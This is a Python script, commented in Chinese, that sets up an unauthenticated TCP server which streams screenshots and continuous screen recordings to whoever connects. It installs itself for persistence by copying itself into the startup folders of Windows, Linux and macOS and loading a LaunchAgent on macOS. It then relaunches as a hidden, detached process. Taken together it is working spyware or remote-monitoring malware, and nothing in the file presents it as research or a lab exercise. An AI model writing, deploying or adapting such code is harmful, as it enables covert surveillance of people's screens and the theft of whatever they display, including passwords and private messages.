import socket
import threading
import time
import os
import platform
import shutil
import subprocess
import sys

import cv2
import numpy as np
from PIL import ImageGrab
from io import BytesIO


class ScreenMonitor:
    def __init__(self, host='0.0.0.0', port=5556):
        self.host = host
        self.port = port
        self.is_recording = False
        self.frame_rate = 10
        self.quality = 80
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def start_server(self):
        self.socket.bind((self.host, self.port))
        self.socket.listen(5)
        print(f"Screen server started on {self.host}:{self.port}")

        while True:
            client_socket, addr = self.socket.accept()
            threading.Thread(target=self.handle_client, args=(client_socket,), daemon=True).start()

    def handle_client(self, client_socket):
        try:
            while True:
                command = client_socket.recv(1024).decode('utf-8').strip()
                if not command:
                    break

                if command == 'screenshot':
                    img_data = self.capture_screenshot()
                    client_socket.sendall(img_data)

                elif command.startswith('start_record'):
                    params = command.split()
                    self.frame_rate = int(params[1]) if len(params) > 1 else 10
                    self.quality = int(params[2]) if len(params) > 2 else 80
                    self.is_recording = True
                    threading.Thread(target=self.record_screen, args=(client_socket,), daemon=True).start()

                elif command == 'stop_record':
                    client_socket.sendall(b'ACK_')  # 发送确认
                    self.is_recording = False

        except ConnectionResetError:
            print("Client disconnected")
        finally:
            client_socket.close()

    def capture_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            img_byte_arr = BytesIO()
            screenshot.save(img_byte_arr, format='JPEG', quality=self.quality)
            return img_byte_arr.getvalue()
        except Exception as e:
            print(f"Screenshot failed: {e}")
            return b''

    def record_screen(self, client_socket):
        print(f"Recording started at {self.frame_rate}FPS")
        try:
            while self.is_recording:
                img = ImageGrab.grab()
                frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, self.quality])
                frame_data = buffer.tobytes()
                client_socket.sendall(len(frame_data).to_bytes(4, 'big') + frame_data)
                time.sleep(1 / self.frame_rate)
        except Exception as e:
            print(f"Recording error: {e}")
        finally:
            print("Recording stopped")


def get_startup_dir():
    """获取开机自启动目录"""
    if platform.system() == "Windows":
        return os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    elif platform.system() == "Linux":
        return os.path.expanduser('~/.config/autostart')
    elif platform.system() == "Darwin":  # macOS
        return os.path.expanduser('~/Library/LaunchAgents')
    else:
        return None


def copy_to_startup():
    """复制自身到开机启动目录并返回新路径"""
    try:
        script_path = os.path.abspath(__file__)
        script_name = os.path.basename(script_path)
        startup_dir = get_startup_dir()

        if not startup_dir:
            return None

        os.makedirs(startup_dir, exist_ok=True)
        target_path = os.path.join(startup_dir, script_name)

        # 如果目标已存在且内容相同，则跳过
        if os.path.exists(target_path):
            with open(script_path, 'rb') as f1, open(target_path, 'rb') as f2:
                if f1.read() == f2.read():
                    return target_path

        shutil.copy2(script_path, target_path)

        # macOS需要特殊处理
        if platform.system() == "Darwin":
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.{script_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{target_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
            plist_path = os.path.join(startup_dir, f'com.user.{script_name}.plist')
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            os.system(f'launchctl load {plist_path}')

        return target_path
    except Exception as e:
        print(f"复制到启动目录失败: {e}")
        return None


def start_new_instance(script_path):
    """启动新实例并返回进程对象"""
    try:
        if platform.system() == "Windows":
            # Windows下使用CREATE_NO_WINDOW标志隐藏窗口
            return subprocess.Popen(
                [sys.executable, script_path, '-silent'],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        else:
            # Linux/macOS下使用nohup后台运行
            return subprocess.Popen(
                [sys.executable, script_path, '-silent'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True
            )
    except Exception as e:
        print(f"启动新实例失败: {e}")
        return None


def main():
    # 如果不是静默模式，且不在启动目录中运行，则复制并启动新实例
    if len(sys.argv) <= 1 or sys.argv[1] != '-silent':
        startup_script = copy_to_startup()
        if startup_script and os.path.abspath(__file__) != os.path.abspath(startup_script):
            new_process = start_new_instance(startup_script)
            if new_process:
                print(f"已启动新实例: {startup_script}")
                sys.exit(0)  # 退出原进程

    # 运行服务器
    monitor = ScreenMonitor()
    monitor.start_server()


if __name__ == "__main__":
    main()